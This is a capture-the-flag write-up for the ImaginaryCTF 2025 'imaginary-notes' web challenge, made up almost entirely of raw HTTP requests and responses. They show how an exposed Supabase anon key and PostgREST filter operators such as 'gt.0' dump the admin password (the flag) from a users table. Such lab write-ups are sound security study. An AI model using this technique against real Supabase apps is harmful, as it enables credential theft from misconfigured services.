# imaginary-notes - Imaginary
## Challenge Info
- Date: 2025
- CTF Name: Imaginary
- Category: web
- Difficulty (subjective): easy
- Points: 100
- Provided Files: Blind
- tools: Burp Suite
## Brief Description
I made a new note taking app using Supabase! Its so secure, I put my flag as the password to the "admin" account. I even put my anonymous key somewhere in the site. The password database is called, "users". http://imaginary-notes.chal.imaginaryctf.org
## Initial Analysis
### Environment
## Vulnerability
## Exploit
### Strategy
### Exploitation Steps
### PoC(Poof of Concept)
### eq.yerin eq.1234
``` http
GET /rest/v1/users?select=*&username=eq.yerin&password=eq.1234 HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:41:08 GMT
Content-Type: application/vnd.pgrst.object+json; charset=utf-8
Content-Length: 82
Content-Range: 0-0/*
Cf-Ray: 97adb20c4d09ea9b-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?password=eq.1234&select=%2A&username=eq.yerin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ed4-83b9-7f49-ac59-84b36fce1208
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 122
Set-Cookie: __cf_bm=vsy6zjMW6JaSWvz3gCZMQ0uG8qqJQc2Cy3vUK.lV0_o-1757158868-1.0.1.1-CwJhXkLMPqYFNQGivklNTt.p7CQiDnDY10GdbxTGlE.Br8C5M8mkOXF5W77z1QKQERQoVS5pNelASnwgx0ZY7Gy4joJQT7VmngodaBZrruQ; path=/; expires=Sat, 06-Sep-25 12:11:08 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

{"id":"331f5dab-606d-49da-9b6b-d448260b43d0","username":"yerin","password":"1234"}
```
### yerin 1234
``` http
GET /rest/v1/users?select=*&username=yerin&password=1234 HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 400 Bad Request
Date: Sat, 06 Sep 2025 11:41:38 GMT
Content-Type: application/json; charset=utf-8
Cf-Ray: 97adb2ca992fea9b-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Proxy-Status: PostgREST; error=PGRST100
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ed4-faa7-7a36-9297-eee0a4fdea3b
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 16
Set-Cookie: __cf_bm=dguNUcKlVkY8zw1AK_v8PxpXqkd5lFsOoiKRDgvvl2M-1757158898-1.0.1.1-JCINBLLp_3hxN_Fhdf3pHTqco.AAkiYv5ZgOMyB6ELgycDdav7CT99UrEgvfF8MdpK.siwgf1uQ.ycTrL1LjjB4mHJ2eD2FUwjRduVqSxM4; path=/; expires=Sat, 06-Sep-25 12:11:38 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

{"code":"PGRST100","details":"unexpected \"y\" expecting \"not\" or operator (eq, gt, ...)","hint":null,"message":"\"failed to parse filter (yerin)\" (line 1, column 1)"}
```
### eq.yerin gt.1233
``` http
GET /rest/v1/users?select=*&username=eq.yerin&password=gt.1233 HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:41:59 GMT
Content-Type: application/vnd.pgrst.object+json; charset=utf-8
Content-Length: 82
Content-Range: 0-0/*
Cf-Ray: 97adb34c3a7aea9b-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?password=gt.1233&select=%2A&username=eq.yerin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ed5-4ba6-76bc-895b-75aac41328d6
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 18
Set-Cookie: __cf_bm=sL3oELMoMJncyuEXiciZqqayW73mG4Of1qvR_JF_JIM-1757158919-1.0.1.1-v.seeTk_8J8yskXmCJLhf34iPIl0PlFjWRv17LfCOwpei1lHUTxH96YOM3EYlFjIZInKDsC9V8CIWfS6V_b8UhWr03dleREsekYI.0SiAi8; path=/; expires=Sat, 06-Sep-25 12:11:59 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

{"id":"331f5dab-606d-49da-9b6b-d448260b43d0","username":"yerin","password":"1234"}
```
### eq.yerin lt.1235
``` http
GET /rest/v1/users?select=*&username=eq.yerin&password=lt.1235 HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:44:14 GMT
Content-Type: application/vnd.pgrst.object+json; charset=utf-8
Content-Length: 82
Content-Range: 0-0/*
Cf-Ray: 97adb699ceceea2f-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?password=lt.1235&select=%2A&username=eq.yerin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ed7-5c2d-7106-9456-cc4052c5de84
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 21
Set-Cookie: __cf_bm=rm0UrNP7t_lZItEsSUzXVaDpLxr6XGKNMbFsDB1I71Y-1757159054-1.0.1.1-ea7RxRETViKcBm6wVXzxfps5X6piR_RcyV5A1nhAJyGXWO9mmQACUMMMMXAyBJbegAlr2ryzOrn2S0gbZFQrsLGYKk8blgFhXVng8YTZHCk; path=/; expires=Sat, 06-Sep-25 12:14:14 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

{"id":"331f5dab-606d-49da-9b6b-d448260b43d0","username":"yerin","password":"1234"}
```
### eq.admin gt.0
``` http
GET /rest/v1/users?select=*&username=eq.admin&password=gt.0 HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/vnd.pgrst.object+json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:43:30 GMT
Content-Type: application/vnd.pgrst.object+json; charset=utf-8
Content-Range: 0-0/*
Cf-Ray: 97adb58738bdea2f-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?password=gt.0&select=%2A&username=eq.admin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ed6-b089-79d9-a233-cb0f3a285c02
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 37
Set-Cookie: __cf_bm=x7.H0W6C3F38BRqSFYq3fPF.bOvxLKhDCHiLe2WaBmE-1757159010-1.0.1.1-WrIMer5mgdvjT36Gf.nkh7ONwQU2UpJ4OTWYqyeDQE7kSyy8epDaTyajy4D9SAFFlRwxzOaxgq63apKcJI0KDnutxAm_iznCk_tru4FCsSw; path=/; expires=Sat, 06-Sep-25 12:13:30 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}
```
### id eq.yerin
``` http
GET /rest/v1/users?select=id&username=eq.yerin HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:53:46 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 47
Content-Range: 0-0/*
Cf-Ray: 97adc48adad130aa-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?select=id&username=eq.yerin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ee0-12d7-710e-8114-a346d1c50893
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 18
Set-Cookie: __cf_bm=CjcCPOkTkPJFe60I1tl0fBZ1h9VDIN0VZpT8.JsF20w-1757159626-1.0.1.1-BK5ORKBAS3D0dstM6dqN_yfREV0A_XYL9nHy5GutwgFmelAt.UYuQqnQoLZLQ_YBtZM8Yt_TA71Qs1dkxAs_5Q_KncReSTIsOeqDanEhsDU; path=/; expires=Sat, 06-Sep-25 12:23:46 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

[{"id":"331f5dab-606d-49da-9b6b-d448260b43d0"}]
```
### password eq.yerin
``` http
GET /rest/v1/users?select=password&username=eq.yerin HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:54:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 21
Content-Range: 0-0/*
Cf-Ray: 97adc5c08938aa50-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?select=password&username=eq.yerin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ee0-d464-7195-8caf-61d3218bf1e2
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 18
Set-Cookie: __cf_bm=bb4cHfXa9IoRJiv9LGHgipCUYP.ojmlORzm.tnQxTss-1757159675-1.0.1.1-5k9yOTsGb7DWfkWfueUhkvJcjwAI47ffBS4MhVr16562pYynFmKMj9oO8WyaiLLKRDzbSqRoy6..YZi3ceXdYULfJxDwAKEEaiDneR445d0; path=/; expires=Sat, 06-Sep-25 12:24:35 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

[{"password":"1234"}]
```
### id eq.admin
``` http
GET /rest/v1/users?select=id&username=eq.admin HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:46:39 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 47
Content-Range: 0-0/*
Cf-Ray: 97adba222eb2a7bd-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?select=id&username=eq.admin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991ed9-9169-7087-8fc5-0756cae9dbc0
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 17
Set-Cookie: __cf_bm=2fDBPtPATt93SThhHr4Ly2G77tG574rWBT2ZcJrNxNQ-1757159199-1.0.1.1-IOlKQZz7W0bN.0yvOrMBI5DyjmCfRsNawXyAnHBWwx3LriyR0UbnDZaaAojqisXDmJrU9yUodaAnz_5ojr5EdR.NOFiPQWmAxU4uOnYp5Vg; path=/; expires=Sat, 06-Sep-25 12:16:39 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

[{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9"}]
```
### * eq.admin
``` http
GET /rest/v1/users?select=*&username=eq.admin HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Sec-Ch-Ua-Mobile: ?0
X-Client-Info: supabase-js-web/2.50.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/json
Accept-Profile: public
Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
Origin: http://imaginary-notes.chal.imaginaryctf.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://imaginary-notes.chal.imaginaryctf.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Priority: u=1, i
```
``` http
HTTP/2 200 OK
Date: Sat, 06 Sep 2025 11:49:46 GMT
Content-Type: application/json; charset=utf-8
Content-Range: 0-0/*
Cf-Ray: 97adbeb20f15ea0b-ICN
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
Content-Location: /users?select=%2A&username=eq.admin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
Content-Profile: public
Sb-Gateway-Version: 1
Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
Sb-Request-Id: 01991edc-6b48-74e3-b446-4a06f42807b1
X-Content-Type-Options: nosniff
X-Envoy-Attempt-Count: 1
X-Envoy-Upstream-Service-Time: 18
Set-Cookie: __cf_bm=pWe9PMklQbPcAMPH6C3HKAa90IVl2tOp8h4MTnDYLAw-1757159386-1.0.1.1-gdugqAYzlcNQmSH66prLB2yHMPjFbltkux0U6e7Bnb64kUVC9wjqrZ.scKjjTaDHPdk4yKw4F1jrPKEOaBnQYDq91yDIGnVXF466Y4R6v80; path=/; expires=Sat, 06-Sep-25 12:19:46 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400

[{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}]
```
![](./../../Resources/images/2025-Imaginary-imaginary-notes1.png "로그인 화면")